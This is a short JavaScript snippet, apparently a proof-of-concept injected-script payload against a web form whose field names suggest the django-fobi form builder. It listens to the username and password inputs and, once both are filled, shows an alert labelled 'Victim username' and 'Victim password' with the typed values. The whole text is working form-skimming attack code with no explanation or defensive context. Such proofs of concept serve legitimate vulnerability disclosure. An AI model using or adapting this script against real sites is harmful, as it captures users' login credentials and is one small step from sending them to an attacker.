
let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('fobi_b61')[0];
    const input2 = document.getElementsByName('fobi_b71')[0];

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim username: '+document.getElementsByName('fobi_b61')[0].value+'\n\nVictim password: '+document.getElementsByName('fobi_b71')[0].value);
         
        }, 3000); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('fobi_b61')[0].addEventListener('input', checkInputs);
  document.getElementsByName('fobi_b71')[0].addEventListener('input', checkInputs);
